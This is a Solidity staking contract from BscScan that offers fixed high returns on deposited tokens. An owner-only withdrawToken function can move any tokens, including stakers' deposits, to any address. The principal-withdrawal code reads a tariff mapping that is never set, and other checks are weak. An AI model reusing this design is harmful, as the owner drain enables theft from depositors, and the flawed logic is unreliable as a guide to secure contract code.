/**
 *Submitted for verification at BscScan.com on 2021-07-23
*/

// SPDX-License-Identifier: none
pragma solidity ^0.8.6;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Stake {

  struct Tariff {
    uint time;
    uint percent;
  }

  struct Investor {
    bool hasStaked;  
    uint invested;
    uint investedAt;
    uint withdrawnRoi;
    uint totalWithdraw;
    uint principalWithdrawnAt;
    bool principalWithdrawn;
  }

  address public owner;
  address tokenAddr = 0x8691BB7E4f4d299716850bE908df9F8e002dED16;
  address contractAddr = address(this);

  Tariff[] public tariffs;

  uint public totalInvestors;
  uint public totalInvested;
  uint public totalWithdrawal;
  uint private stakeLimit = 1000000 * 10**18;

  mapping (address => Investor) investors;
  mapping (address => Tariff) public tariff;
  
  event DepositAt(address user, uint amount);
  event Withdraw(address user, uint amount);
  event TransferOwnership(address user);
  event Received(address, uint);

    constructor()  {
        tariffs.push(Tariff(3600 days, 1500));
        owner = msg.sender;
    }
    
    // Stake tokens on the contract
    function deposit(uint tokenAmount) public {
        
        IERC20 token = IERC20(tokenAddr);
        require(tokenAmount > 10000000000000000000, "Stake amount not sufficient");
        require(token.balanceOf(msg.sender) > 0, "Not enough balance of user");
        require(investors[msg.sender].hasStaked == false, "Already staked");
        require(tokenAmount <= stakeLimit, "Stake limit reached");
        
        token.approve(contractAddr, tokenAmount);
        token.transferFrom(msg.sender, contractAddr, tokenAmount);
      
        investors[msg.sender].hasStaked = true;
        investors[msg.sender].invested = tokenAmount;
        investors[msg.sender].investedAt = block.timestamp;
            
        totalInvested += tokenAmount;
        totalInvestors++;
        stakeLimit = stakeLimit - tokenAmount;
    
        emit DepositAt(msg.sender, tokenAmount);
    }
    
    // View withdrawable ROI
    function withdrawableView(address user) public view returns (uint amount) {
        Investor storage investor = investors[user];
           
            uint finish = investor.investedAt + tariffs[0].time;
            uint since = investor.investedAt;
            uint till = block.timestamp > finish ? finish : block.timestamp;
            
            if(investor.principalWithdrawn == true){
                amount = 0;
            }
            else{
                amount = investor.invested * (till - since) * tariffs[0].percent / tariffs[0].time / 100;
            }
            
           return amount;
    }   
  
    // WithdrawROI
    function withdrawROI() public {
        
        uint amount;
        address user = msg.sender;
        Investor storage investor = investors[user];
            
        require(investor.principalWithdrawn == false, "Already withdrawn");
        if(investor.principalWithdrawnAt != 0){
            require(investor.principalWithdrawnAt - investor.investedAt > 3 minutes, "Not eligible");
        }
        
        uint finish = investor.investedAt + tariffs[0].time;
        uint since = investor.investedAt;
        uint till = block.timestamp > finish ? finish : block.timestamp;
        
        
        if(till - since >= 3 minutes){
            amount = ( investor.invested ) * ( till - since ) * tariffs[0].percent / tariffs[0].time / 100;
            amount = amount - investor.withdrawnRoi;
        }
        
        else{
            revert("Time not reached");
        }
        
        investor.withdrawnRoi += amount;
        investor.totalWithdraw += amount;
        
        IERC20 token = IERC20(tokenAddr);

        token.transfer(user, amount);
        
        totalWithdrawal += amount;

        emit Withdraw(user, amount);
    }
  
    // Principal withdraw wtih ROI(if any left)
    function principalWithdraw() public {
        
        uint amount;
        address user = msg.sender;
        Investor storage investor = investors[user];
            
        Tariff storage tariffNew = tariff[user];
        
        uint finish = investor.investedAt + tariffNew.time;
        uint since = investor.investedAt;
        uint till = block.timestamp > finish ? finish : block.timestamp;
        
        if(till - since < 3 minutes){
            amount = investor.invested;
        }
        else{
            amount = investor.invested + ( investor.invested ) * ( till - since ) * tariffNew.percent / tariffNew.time / 100;
        }
        
        amount = amount - investor.withdrawnRoi;
        
        investor.totalWithdraw += amount;
        investor.principalWithdrawn = true;
        investor.principalWithdrawnAt = block.timestamp;
        investor.hasStaked = false;
        
        IERC20 token = IERC20(tokenAddr);
        
        token.transfer(user, amount);
        totalWithdrawal += amount;
        investor.invested = 0;
        
        emit Withdraw(msg.sender, amount);
    }
  
    // View user details
    function myData(address userAddr) public view returns (uint invested, uint investedAt, uint withdrawnRoi) {
        Investor storage investor = investors[userAddr];
        invested = investor.invested;
        investedAt = investor.investedAt;
        withdrawnRoi = investor.withdrawnRoi;
        
        return (invested, investedAt, withdrawnRoi);
    }
    
    // Owner only token withdraw
    function withdrawToken(address tokenAddress, address to, uint amount) public {
        require(msg.sender == owner, "Only owner");
        IERC20 token = IERC20(tokenAddress);
        token.transfer(to, amount);
    }  
    
    // Owner only BNB withdraw
    function withdrawBNB(address payable to, uint amount) public {
        require(msg.sender == owner, "Only owner");
        to.transfer(amount);
    }
  
    // Transfer ownership. Only owner can call this
    function transferOwnership(address to) public {
        require(msg.sender == owner, "Only owner");
        owner = to;
        emit TransferOwnership(owner);
    }
    
    // Receive BNB function
    receive() external payable {
        emit Received(msg.sender, msg.value);
    }  
    
}